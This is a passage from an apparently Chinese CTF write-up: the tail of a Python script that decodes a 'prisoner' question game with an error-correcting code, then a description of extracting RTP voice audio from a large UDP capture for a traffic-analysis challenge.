</span></span><span class="line"><span class="cl">            <span class="n">prefix</span> <span class="o">=</span> <span class="n">brute_prefix</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="n">hexd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">prefix</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] POW failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] POW solved:&#34;</span><span class="p">,</span> <span class="n">prefix</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">send_line</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">prefix</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">intro</span> <span class="o">=</span> <span class="n">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;Ask your question:&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">intro</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">_</span> <span class="o">=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">rounds</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rounds</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Round </span><span class="si">{</span><span class="n">rounds</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">answers</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># send our designed queries sequentially</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">q</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">queries</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[&gt;] Q</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">02d</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_line</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">resp</span> <span class="o">=</span> <span class="n">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;Prisoner&#39;s response:&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">resp</span> <span class="o">+=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.25</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;smirks&#34;</span> <span class="ow">in</span> <span class="n">resp</span> <span class="ow">or</span> <span class="s2">&#34;refuse to answer&#34;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] server refused phrasing. aborting&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="n">tail</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Prisoner&#39;s response:&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># parse boolean</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;True&#34;</span> <span class="ow">in</span> <span class="n">tail</span> <span class="ow">and</span> <span class="s2">&#34;False&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">val</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="s2">&#34;False&#34;</span> <span class="ow">in</span> <span class="n">tail</span> <span class="ow">and</span> <span class="s2">&#34;True&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">val</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="s2">&#34;True&#34;</span> <span class="ow">in</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">val</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="s2">&#34;False&#34;</span> <span class="ow">in</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">val</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">val</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="n">answers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">bool</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># decode: find s in 256 such that Hamming distance between encode_by_G(s) and answers &lt;= 2</span>
</span></span><span class="line"><span class="cl">            <span class="n">best</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">            <span class="n">best_hd</span> <span class="o">=</span> <span class="mi">999</span>
</span></span><span class="line"><span class="cl">            <span class="n">cands</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">product</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">code</span> <span class="o">=</span> <span class="n">encode_by_G</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">G_cols</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">hd</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="nb">int</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">17</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">hd</span> <span class="o">&lt;</span> <span class="n">best_hd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">best_hd</span> <span class="o">=</span> <span class="n">hd</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cands</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="n">hd</span> <span class="o">==</span> <span class="n">best_hd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cands</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] best_hd=</span><span class="si">{</span><span class="n">best_hd</span><span class="si">}</span><span class="s2"> candidate_count=</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">cands</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">best_hd</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">cands</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># pick unique if single, else majority among candidates</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cands</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">guess</span> <span class="o">=</span> <span class="n">cands</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># majority vote across candidate bits</span>
</span></span><span class="line"><span class="cl">                    <span class="n">counts</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cands</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                            <span class="n">counts</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">+=</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">                    <span class="n">guess</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">counts</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">cands</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># fallback: try brute-force search flipping up to 2 bits in answers (shouldn&#39;t be necessary)</span>
</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">flip_idxs</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">combinations</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">17</span><span class="p">),</span> <span class="mi">0</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># try flipping these and see if simple decode by taking first 8 entries yields consistent s</span>
</span></span><span class="line"><span class="cl">                    <span class="n">alt</span> <span class="o">=</span> <span class="n">answers</span><span class="p">[:]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">fi</span> <span class="ow">in</span> <span class="n">flip_idxs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">alt</span><span class="p">[</span><span class="n">fi</span><span class="p">]</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">alt</span><span class="p">[</span><span class="n">fi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># derive candidate s from first 8 alt bits by decoding linear system? but we used generator form: columns include identity first, so first 8 columns were identity in our G construction -&gt; we can map s directly</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># our find_good_G constructed first 8 columns as identity, so alt[0..7] directly are s bits</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cand_s</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">alt</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                    <span class="n">code</span> <span class="o">=</span> <span class="n">encode_by_G</span><span class="p">(</span><span class="n">cand_s</span><span class="p">,</span> <span class="n">G_cols</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="nb">bool</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="nb">bool</span><span class="p">(</span><span class="n">alt</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">17</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">                        <span class="n">guess</span> <span class="o">=</span> <span class="n">cand_s</span>
</span></span><span class="line"><span class="cl">                        <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># last fallback: choose minimal hd candidate</span>
</span></span><span class="line"><span class="cl">                    <span class="n">guess</span> <span class="o">=</span> <span class="n">cands</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">cands</span> <span class="k">else</span> <span class="nb">tuple</span><span class="p">(</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] submit guess:&#34;</span><span class="p">,</span> <span class="n">guess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">send_line</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">guess</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">out</span> <span class="o">=</span> <span class="n">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">out</span> <span class="o">+=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;confesses&#34;</span> <span class="ow">in</span> <span class="n">out</span> <span class="ow">or</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">out</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s2">&#34;you win&#34;</span> <span class="ow">in</span> <span class="n">out</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] success final output:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;fell for my deception&#34;</span> <span class="ow">in</span> <span class="n">out</span> <span class="ow">or</span> <span class="s2">&#34;disciplinary action&#34;</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] failed this round&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Exception:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span> <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span> <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="n">run_coded</span><span class="p">(</span><span class="n">attempts_find_G</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] finished without success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Exception outer:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>非常稳定，我发现让ai解题的时候让他去找巧妙的解法很容易出</p>
<p><img src="/img/2025-QWB-S9/3.png" alt="img"></p>
<h2 id="谍影重重-60">谍影重重 6.0</h2>
<p>流量分析+妙妙历史猜谜（靠北）</p>
<p>打开题目是一个700多m的流量包，要吓尿了</p>
<p>进去看到全是udp流量，前期绕了很多圈子，特别是看到了个manolito协议，后面反应过来是ws自己误识别的</p>
<p><img src="/img/2025-QWB-S9/4.png" alt="img"></p>
<p>实际上这个udp流量就是rtp数据（看他的数据格式跟之前wm那个voice hacker的流量数据简直一模一样），所以要将他们的音频提取出来，但是简单过了一下发现有1300个端口，每个端口对应一条语音，而且流量包太大了，全部用ws根本不现实，所以要用脚本，之前做voice_hacker有过脚本，在那基础上让ai优化升级了一下</p>
<p>主要调整点在于原音频声音很小，而且有很多空白的地方，所以对提取的音频音量加大了，而且还去掉了空白的部分</p>
<p>然后呢实际上1300个端口，每个端口都有2段数据，就是两段不同的音频，写脚本提取的时候要将重复的区分开，我让ai把他们放在了两个文件夹，然后将同一个目录中的音频按端口顺序合并为一个音频</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
